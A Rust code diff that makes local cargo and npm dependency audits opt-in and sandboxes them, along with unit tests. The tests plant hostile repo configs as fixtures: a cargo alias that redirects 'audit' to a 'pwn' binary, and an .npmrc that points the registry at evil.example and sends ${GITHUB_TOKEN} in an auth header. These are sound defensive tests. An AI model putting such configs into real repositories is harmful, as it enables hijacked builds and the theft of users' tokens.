@@ -9,13 +9,14 @@
 //!   `security_events` scope for a classic token, or a public repo); a 403 or
 //!   404 is cached as *unavailable* with a reason rather than treated as an
 //!   error, since it's a stable answer for that repo and token.
-//! - **Local audits** for repos *without* a GitHub remote ([`refresh_local`],
-//!   blocking): `cargo audit --json` when `Cargo.lock` exists and cargo-audit
-//!   is installed, `npm audit --json --package-lock-only` when
-//!   `package-lock.json` exists and npm is installed. Nothing is ever
-//!   installed, a missing lockfile means the audit is skipped (cargo-audit
-//!   would otherwise generate one inside the repo), and each run is time-boxed
-//!   and killed if it overruns.
+//! - **Local audits**, opt-in via `AppConfig::local_audits` (off by default),
+//!   for repos *without* a GitHub remote ([`refresh_local`], blocking):
+//!   cargo-audit when `Cargo.lock` exists and cargo-audit is installed, npm
+//!   audit when `package-lock.json` exists and npm is installed. Nothing is
+//!   ever installed, a missing lockfile means the audit is skipped, and each
+//!   run is time-boxed and killed if it overruns. The repo is treated as
+//!   hostile: no tool runs with it as the working directory or reads its
+//!   config (see [`audit_local`]).
 //!
 //! Results are cached in `advisory_cache` with a TTL, keyed like `ci_cache`:
 //! (domain, slug) for Dependabot, ("local", repo id) for local audits. As in
@@ -23,8 +24,9 @@
 //! known report.
 
 use std::collections::{HashMap, HashSet};
+use std::ffi::OsString;
 use std::io::Read;
-use std::path::Path;
+use std::path::{Path, PathBuf};
 use std::process::{Command, Stdio};
 use std::time::{Duration, Instant};
 
@@ -32,7 +34,7 @@ use futures_util::stream::{self, StreamExt};
 use serde::{Deserialize, Serialize};
 
 use crate::attention::AdvisoryFact;
-use crate::model::{Host, Repo};
+use crate::model::{AppConfig, Host, Repo};
 use crate::{cache, enrich, forge, oauth};
 
 /// How long a cached report stays fresh. Advisories change slowly; a few
@@ -305,7 +307,14 @@ fn next_link(header: &str) -> Option<String> {
 /// Run the local audits for every repo *without* a GitHub remote whose cached
 /// report is stale (all when `force`). Blocking: call it off the UI thread.
 /// Repos with no lockfile, or whose tool isn't installed, are skipped.
-pub fn refresh_local(repos: &[Repo], now: i64, force: bool) -> Outcome {
+///
+/// **Opt-in**: a no-op unless `cfg.local_audits` is set (off by default).
+/// Even sandboxed (see [`audit_local`]), running a tool over a lockfile from
+/// a repo cloned from anywhere is a choice the user makes, not a default.
+pub fn refresh_local(repos: &[Repo], cfg: &AppConfig, now: i64, force: bool) -> Outcome {
+    if !cfg.local_audits {
+        return Outcome::default();
+    }
     let fresh = if force {
         HashSet::new()
     } else {
@@ -334,29 +343,210 @@ pub fn refresh_local(repos: &[Repo], now: i64, force: bool) -> Outcome {
 /// Audit one repo locally: cargo audit if it has a `Cargo.lock`, else npm
 /// audit if it has a `package-lock.json`. `None` when neither applies or the
 /// tool isn't installed. A failed or timed-out run is an *unavailable* report.
+///
+/// The repo is untrusted input, so neither tool runs *in* it:
+///
+/// - **cargo**: the `cargo-audit` binary is called directly (not `cargo
+///   audit`, which would read the repo's `.cargo/config.toml` aliases and
+///   honour its `rust-toolchain.toml`), with `--file <abs>/Cargo.lock`, from a
+///   fresh empty directory, with a cleared environment (PATH, HOME and
+///   CARGO_HOME only, so the user's advisory DB is found).
+/// - **npm**: `package-lock.json` (+ `package.json`) is copied into a fresh
+///   directory and audited there, so the repo's `.npmrc` (registry override,
+///   `${ENV}` secrets in auth headers) is never read; the registry is pinned
+///   to npmjs.org, user/global config point at an empty file, and the
+///   environment is PATH plus a throwaway HOME. If the copy fails, npm
+///   doesn't run.
 pub fn audit_local(path: &Path, timeout: Duration, now: i64) -> Option<AdvisoryReport> {
-    if path.join("Cargo.lock").is_file() && which::which("cargo-audit").is_ok() {
-        let mut cmd = Command::new("cargo");
-        cmd.args(["audit", "--json"]).current_dir(path);
-        return Some(audit_report(
-            AdvisorySource::CargoAudit,
-            run_timeboxed(cmd, timeout),
-            parse_cargo_audit,
-            now,
-        ));
+    let lockfile = path.join("Cargo.lock");
+    if lockfile.is_file() {
+        if let Ok(bin) = which::which("cargo-audit") {
+            let report = match Sandbox::new() {
+                Ok(sandbox) => {
+                    let lockfile = lockfile.canonicalize().unwrap_or(lockfile);
+                    let plan = cargo_audit_plan(&bin, &lockfile, sandbox.path(), env_var);
+                    run_timeboxed(plan.command(), timeout)
+                }
+                Err(e) => Err(e),
+            };
+            return Some(audit_report(
+                AdvisorySource::CargoAudit,
+                report,
+                parse_cargo_audit,
+                now,
+            ));
+        }
     }
-    if path.join("package-lock.json").is_file() && which::which("npm").is_ok() {
-        let mut cmd = Command::new("npm");
-        cmd.args(["audit", "--json", "--package-lock-only"])
-            .current_dir(path);
-        return Some(audit_report(
-            AdvisorySource::NpmAudit,
-            run_timeboxed(cmd, timeout),
-            parse_npm_audit,
-            now,
-        ));
+    if path.join("package-lock.json").is_file() {
+        if let Ok(bin) = which::which("npm") {
+            let report = Sandbox::new().and_then(|sandbox| {
+                stage_npm(path, sandbox.path())?;
+                let plan = npm_audit_plan(&bin, sandbox.path(), env_var);
+                run_timeboxed(plan.command(), timeout)
+            });
+            return Some(audit_report(
+                AdvisorySource::NpmAudit,
+                report,
+                parse_npm_audit,
+                now,
+            ));
+        }
     }
     None
+}
+
+fn env_var(key: &str) -> Option<OsString> {
+    std::env::var_os(key)
+}
+
+/// A fully specified audit process: program, argv, working directory and the
+/// *complete* environment (the command is built with `env_clear`). Pure data,
+/// so the sandboxing is unit-testable without running anything.
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct AuditPlan {
+    program: PathBuf,
+    args: Vec<OsString>,
+    cwd: PathBuf,
+    env: Vec<(OsString, OsString)>,
+}
+
+impl AuditPlan {
+    fn command(&self) -> Command {
+        let mut cmd = Command::new(&self.program);
+        cmd.args(&self.args)
+            .current_dir(&self.cwd)
+            .env_clear()
+            .envs(self.env.iter().map(|(k, v)| (k, v)));
+        cmd
+    }
+}
+
+/// `cargo-audit audit --json --file <lockfile>`, run from `cwd` (a fresh,
+/// empty directory) with only PATH, HOME and CARGO_HOME. `env` reads the
+/// app's own environment (injected for tests).
+fn cargo_audit_plan(
+    bin: &Path,
+    lockfile: &Path,
+    cwd: &Path,
+    env: impl Fn(&str) -> Option<OsString>,
+) -> AuditPlan {
+    let home = env("HOME");
+    let cargo_home = env("CARGO_HOME").or_else(|| {
+        home.as_ref()
+            .map(|h| Path::new(h).join(".cargo").into_os_string())
+    });
+    let mut vars = Vec::new();
+    for (key, value) in [
+        ("PATH", env("PATH")),
+        ("HOME", home),
+        ("CARGO_HOME", cargo_home),
+    ] {
+        if let Some(v) = value {
+            vars.push((OsString::from(key), v));
+        }
+    }
+    let mut args: Vec<OsString> = ["audit", "--json", "--file"].map(OsString::from).into();
+    args.push(lockfile.as_os_str().to_owned());
+    AuditPlan {
+        program: bin.to_path_buf(),
+        args,
+        cwd: cwd.to_path_buf(),
+        env: vars,
+    }
+}
+
+/// `npm audit --json --package-lock-only` inside `dir` (holding the staged
+/// lockfile and an empty npmrc), registry pinned, user/global config pointed
+/// at the empty file, HOME set to `dir`, and nothing else but PATH.
+fn npm_audit_plan(bin: &Path, dir: &Path, env: impl Fn(&str) -> Option<OsString>) -> AuditPlan {
+    let rc = dir.join(EMPTY_NPMRC);
+    let flag = |name: &str, path: &Path| {
+        let mut s = OsString::from(name);
+        s.push(path.as_os_str());
+        s
+    };
+    let mut args: Vec<OsString> = [
+        "audit",
+        "--json",
+        "--package-lock-only",
+        "--registry=https://registry.npmjs.org/",
+    ]
+    .map(OsString::from)
+    .into();
+    args.push(flag("--userconfig=", &rc));
+    args.push(flag("--globalconfig=", &rc));
+    let mut vars = Vec::new();
+    if let Some(path) = env("PATH") {
+        vars.push((OsString::from("PATH"), path));
+    }
+    vars.push((OsString::from("HOME"), dir.as_os_str().to_owned()));
+    AuditPlan {
+        program: bin.to_path_buf(),
+        args,
+        cwd: dir.to_path_buf(),
+        env: vars,
+    }
+}
+
+/// The empty npm config file written into the npm sandbox.
+const EMPTY_NPMRC: &str = "empty-npmrc";
+
+/// Copy just the npm manifests into `dir` and write the empty npmrc. Only
+/// regular files are copied (a symlinked lockfile is refused), and a failed
+/// lockfile copy is an error so npm never runs without it.
+fn stage_npm(repo: &Path, dir: &Path) -> Result<(), String> {
+    let copy = |name: &str| -> Result<bool, String> {
+        let src = repo.join(name);
+        match std::fs::symlink_metadata(&src) {
+            Ok(md) if md.is_file() => std::fs::copy(&src, dir.join(name))
+                .map(|_| true)
+                .map_err(|e| format!("couldn't stage {name}: {e}")),
+            Ok(_) => Err(format!("{name} isn't a regular file")),
+            Err(_) => Ok(false),
+        }
+    };
+    if !copy("package-lock.json")? {
+        return Err("couldn't stage package-lock.json".into());
+    }
+    copy("package.json")?;
+    std::fs::write(dir.join(EMPTY_NPMRC), "").map_err(|e| e.to_string())
+}
+
+/// A fresh, private, empty temp directory, removed on drop.
+struct Sandbox(PathBuf);
+
+impl Sandbox {
+    fn new() -> Result<Self, String> {
+        use std::os::unix::fs::DirBuilderExt;
+        use std::sync::atomic::{AtomicU64, Ordering};
+        static SEQ: AtomicU64 = AtomicU64::new(0);
+        let nanos = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .map(|d| d.as_nanos())
+            .unwrap_or(0);
+        let dir = std::env::temp_dir().join(format!(
+            "orrery-audit-{}-{nanos}-{}",
+            std::process::id(),
+            SEQ.fetch_add(1, Ordering::Relaxed)
+        ));
+        // `create` (not `create_all`) fails if it already exists, so the
+        // directory is always one we made, mode 0700.
+        std::fs::DirBuilder::new()
+            .mode(0o700)
+            .create(&dir)
+            .map_err(|e| format!("couldn't create audit sandbox: {e}"))?;
+        Ok(Sandbox(dir))
+    }
+
+    fn path(&self) -> &Path {
+        &self.0
+    }
+}
+
+impl Drop for Sandbox {
+    fn drop(&mut self) {
+        let _ = std::fs::remove_dir_all(&self.0);
+    }
 }
 
 fn audit_report(
@@ -762,6 +952,167 @@ mod tests {
         std::fs::write(dir.path().join("Cargo.toml"), "[package]").unwrap();
         std::fs::write(dir.path().join("package.json"), "{}").unwrap();
         assert_eq!(audit_local(dir.path(), Duration::from_secs(1), 0), None);
+    }
+
+    /// The app's environment as a test sees it: secrets and repo-steering
+    /// overrides that must never reach an audit process.
+    fn hostile_env(key: &str) -> Option<OsString> {
+        match key {
+            "PATH" => Some("/usr/bin:/bin".into()),
+            "HOME" => Some("/home/u".into()),
+            "GITHUB_TOKEN" => Some("ghp_secret".into()),
+            "NPM_TOKEN" => Some("npm_secret".into()),
+            "RUSTUP_TOOLCHAIN" => Some("evil".into()),
+            "NPM_CONFIG_REGISTRY" => Some("https://evil.example/".into()),
+            _ => None,
+        }
+    }
+
+    fn env_keys(plan: &AuditPlan) -> Vec<&str> {
+        plan.env.iter().map(|(k, _)| k.to_str().unwrap()).collect()
+    }
+
+    #[test]
+    fn cargo_plan_never_runs_in_the_repo_or_through_cargo() {
+        // A hostile repo: a cargo alias that would hijack `cargo audit`, and a
+        // pinned toolchain rustup would download.
+        let repo = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(repo.path().join(".cargo")).unwrap();
+        std::fs::write(
+            repo.path().join(".cargo/config.toml"),
+            "[alias]\naudit = \"run --bin pwn\"\n",
+        )
+        .unwrap();
+        std::fs::write(repo.path().join("rust-toolchain.toml"), "[toolchain]\n").unwrap();
+        let lock = repo.path().join("Cargo.lock");
+        std::fs::write(&lock, "").unwrap();
+        let sandbox = Sandbox::new().unwrap();
+
+        let plan = cargo_audit_plan(
+            Path::new("/usr/bin/cargo-audit"),
+            &lock,
+            sandbox.path(),
+            hostile_env,
+        );
+        assert_eq!(plan.program, Path::new("/usr/bin/cargo-audit"));
+        assert_eq!(
+            plan.args,
+            vec![
+                OsString::from("audit"),
+                "--json".into(),
+                "--file".into(),
+                lock.clone().into_os_string(),
+            ]
+        );
+        assert_eq!(plan.cwd, sandbox.path());
+        assert!(!plan.cwd.starts_with(repo.path()));
+        // The sandbox holds nothing for cargo to pick up.
+        assert_eq!(std::fs::read_dir(&plan.cwd).unwrap().count(), 0);
+        assert_eq!(env_keys(&plan), vec!["PATH", "HOME", "CARGO_HOME"]);
+        assert!(plan
+            .env
+            .contains(&("CARGO_HOME".into(), "/home/u/.cargo".into())));
+
+        // The built command clears the inherited environment.
+        let cmd = plan.command();
+        assert_eq!(cmd.get_current_dir(), Some(sandbox.path()));
+        let envs: Vec<_> = cmd.get_envs().map(|(k, _)| k.to_owned()).collect();
+        assert_eq!(envs.len(), 3);
+    }
+
+    #[test]
+    fn npm_plan_audits_a_staged_copy_with_pinned_config() {
+        let repo = tempfile::tempdir().unwrap();
+        std::fs::write(
+            repo.path().join("package-lock.json"),
+            "{\"lockfileVersion\":3}",
+        )
+        .unwrap();
+        std::fs::write(repo.path().join("package.json"), "{}").unwrap();
+        std::fs::write(
+            repo.path().join(".npmrc"),
+            "registry=https://evil.example/\n//evil.example/:_authToken=${GITHUB_TOKEN}\n",
+        )
+        .unwrap();
+        let sandbox = Sandbox::new().unwrap();
+        stage_npm(repo.path(), sandbox.path()).unwrap();
+        let mut staged: Vec<String> = std::fs::read_dir(sandbox.path())
+            .unwrap()
+            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
+            .collect();
+        staged.sort();
+        assert_eq!(
+            staged,
+            vec![EMPTY_NPMRC, "package-lock.json", "package.json"]
+        );
+        assert_eq!(
+            std::fs::read_to_string(sandbox.path().join(EMPTY_NPMRC)).unwrap(),
+            ""
+        );
+
+        let plan = npm_audit_plan(Path::new("/usr/bin/npm"), sandbox.path(), hostile_env);
+        assert_eq!(plan.cwd, sandbox.path());
+        assert!(!plan.cwd.starts_with(repo.path()));
+        let args: Vec<String> = plan
+            .args
+            .iter()
+            .map(|a| a.to_string_lossy().into_owned())
+            .collect();
+        let rc = sandbox
+            .path()
+            .join(EMPTY_NPMRC)
+            .to_string_lossy()
+            .into_owned();
+        assert!(args.contains(&"--registry=https://registry.npmjs.org/".to_string()));
+        assert!(args.contains(&format!("--userconfig={rc}")));
+        assert!(args.contains(&format!("--globalconfig={rc}")));
+        assert_eq!(env_keys(&plan), vec!["PATH", "HOME"]);
+        assert!(plan
+            .env
+            .contains(&("HOME".into(), sandbox.path().as_os_str().to_owned())));
+    }
+
+    #[test]
+    fn npm_staging_refuses_a_missing_or_symlinked_lockfile() {
+        let repo = tempfile::tempdir().unwrap();
+        let sandbox = Sandbox::new().unwrap();
+        assert!(stage_npm(repo.path(), sandbox.path()).is_err());
+
+        let outside = tempfile::tempdir().unwrap();
+        std::fs::write(outside.path().join("secret"), "x").unwrap();
+        std::os::unix::fs::symlink(
+            outside.path().join("secret"),
+            repo.path().join("package-lock.json"),
+        )
+        .unwrap();
+        assert!(stage_npm(repo.path(), sandbox.path()).is_err());
+    }
+
+    #[test]
+    fn sandbox_is_private_and_removed_on_drop() {
+        use std::os::unix::fs::PermissionsExt;
+        let sandbox = Sandbox::new().unwrap();
+        let path = sandbox.path().to_path_buf();
+        let mode = std::fs::metadata(&path).unwrap().permissions().mode();
+        assert_eq!(mode & 0o777, 0o700);
+        drop(sandbox);
+        assert!(!path.exists());
+    }
+
+    #[test]
+    fn local_audits_are_off_by_default() {
+        let cfg = AppConfig::default();
+        assert!(!cfg.local_audits);
+        // Off → nothing runs, nothing is read or written.
+        let repo = tempfile::tempdir().unwrap();
+        std::fs::write(repo.path().join("Cargo.lock"), "").unwrap();
+        let mut r = sample(&repo.path().to_string_lossy(), Host::Github, "", "");
+        r.host = None;
+        let out = refresh_local(&[r], &cfg, 0, true);
+        assert_eq!((out.updated, out.errors), (0, 0));
+        // An older config without the key also defaults to off.
+        let parsed: AppConfig = toml::from_str("roots = []").unwrap();
+        assert!(!parsed.local_audits);
     }
 
     fn mem() -> rusqlite::Connection {
